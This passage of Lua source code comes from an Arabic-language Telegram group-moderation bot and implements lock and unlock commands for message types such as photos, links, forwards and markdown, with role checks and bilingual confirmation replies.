absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 61, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'markdown:lock'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ markdown is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵمٱركدٱون بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "tgservice" or mutepts[2] == "الاشعارات" then
if not DevAbs:get(loolIQ..'bot:tgservice:jk'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock tgservice ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱلٱشعٱرٱت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 60, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:tgservice:jk'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ tgserice is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱشعٱرٱت بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "fwd" or mutepts[2] == "التوجيه" then
if not DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock fwd ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـتوجيه فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:forward:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ fwd is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـتوجيه بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
end
end
if text == 'قفل الفشار' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور الاساسي '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_ownerall(msg.sender_user_id_) then
tar = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(msg.sender_user_id_) then
tar = 'ٱلٱدمن ٱڵعٱم'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧنشئ'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧدير'
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱلٱدمـۧن'
end
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـفشٱر فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 57, string.len(msg.sender_user_id_))
DevAbs:del(loolIQ.."fshar"..msg.chat_id_)
end
if text == 'فتح الفشار' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور الاساسي '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_ownerall(msg.sender_user_id_) then
tar = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(msg.sender_user_id_) then
tar = 'ٱلٱدمن ٱڵعٱم'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧنشئ'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧدير'
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱلٱدمـۧن'
end
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـفشٱر فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
DevAbs:set(loolIQ.."fshar"..msg.chat_id_, true)
end
if text == 'قفل الكفر' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور الاساسي '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_ownerall(msg.sender_user_id_) then
tar = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(msg.sender_user_id_) then
tar = 'ٱلٱدمن ٱڵعٱم'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧنشئ'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧدير'
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱلٱدمـۧن'
end
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـكفر فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
DevAbs:del(loolIQ.."kaf"..msg.chat_id_)
end
if text == 'فتح الكفر' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور الاساسي '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_ownerall(msg.sender_user_id_) then
tar = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(msg.sender_user_id_) then
tar = 'ٱلٱدمن ٱڵعٱم'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧنشئ'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧدير'
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱلٱدمـۧن'
end
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـكفر فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
DevAbs:set(loolIQ.."kaf"..msg.chat_id_, true)
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nlock (.*)$") or text:match("^فتح (.*)$") then
local unmutept = {string.match(text, "^([Uu]nlock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور الاساسي '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_ownerall(msg.sender_user_id_) then
tar = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(msg.sender_user_id_) then
tar = 'ٱلٱدمن ٱڵعٱم'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧنشئ'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧدير'
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱلٱدمـۧن'
end
local unmutepts = {string.match(text, "^(فتح) (.*)$")}
if unmutept[2] == "all" or unmutepts[2] == "الكل" then
if DevAbs:get(loolIQ..'bot:muteall'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock all ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح جـمـيع ٱڵـوسـآئط \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:muteall'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ all is already unocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ جـمـيع ٱڵـوسـآئط بٱڵـتٱكيد مۘفتوحة', 1, 'md')
end
end
end
if unmutept[2] == "text" or unmutepts[2] == "الدردشه" then
if DevAbs:get(loolIQ..'bot:text:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock text ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـډرډشة فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:text:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ text is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـډرډشة بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "photo" or unmutepts[2] == "الصور" then
if DevAbs:get(loolIQ..'bot:photo:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock photos ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـصـۄر فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 57, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:photo:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ photos is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـصـۄر بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "spam" or unmutepts[2] == "الكلايش" then
if DevAbs:get(loolIQ..'bot:spam:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock spam ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـكـلٱيش فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:spam:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ spam is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـكـلٱيش بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "video" or unmutepts[2] == "الفيديو" then
if DevAbs:get(loolIQ..'bot:video:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock video ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـفيډيۄ فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:video:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ video is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـفيډيۄ بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "file" or unmutepts[2] == "الملفات" then
if DevAbs:get(loolIQ..'bot:document:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock file ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـمٌلفـآټ فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:document:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ file is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـمٌلفـآټ بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "inline" or unmutepts[2] == "الاونلاين" then
if DevAbs:get(loolIQ..'bot:inline:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock inline ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱلٱۄنلٱين فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 61, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:inline:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ inline is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱۄنلٱين بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "markdown" or unmutepts[2] == "الماركداون" then
if DevAbs:get(loolIQ..'markdown:lock'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock markdown ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵمٱركدٱون فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 62, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'markdown:lock'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ markdown is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵمٱركدٱون بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "gif" or unmutepts[2] == "المتحركه" then
if DevAbs:get(loolIQ..'bot:gifs:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock gif ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـمتحركة فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 60, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:gifs:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ gif is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـمتحركة بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "music" or unmutepts[2] == "الاغاني" then
if DevAbs:get(loolIQ..'bot:music:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock music ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱلٱغـٱنـي فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:music:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ music is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱغـٱنـي بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "voice" or unmutepts[2] == "الصوت" then
if DevAbs:get(loolIQ..'bot:voice:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock voice ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـصۄت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 57, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:voice:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ voice is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـصۄت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "links" or unmutepts[2] == "الروابط" then
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock links ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـرۄٱبط فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:links:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ links is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـرۄٱبط بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "location" or unmutepts[2] == "المواقع" then
if DevAbs:get(loolIQ..'bot:location:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock location ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـمۄٱقع فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:location:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ location is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـمۄٱقع بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "tag" or unmutepts[2] == "المعرف" then
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock tag ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـمعرف فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'tags:lock'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ tag is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـمعرف بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "strict" or unmutepts[2] == "الحمايه" then
if DevAbs:get(loolIQ..'bot:strict'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock strict ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـحمٱية فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:strict'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ strict is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـحمٱية بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "abstag" or unmutepts[2] == "الهاشتاك" then
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock abstag ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـهٱشتٱك فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 60, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:abstag:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ abstag is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـهٱشتٱك بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "contact" or unmutepts[2] == "الجهات" then
if DevAbs:get(loolIQ..'bot:contact:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock contact ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـجهٱت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:contact:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ contact is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـجهٱت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "webpage" or unmutepts[2] == "الشبكات" then
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
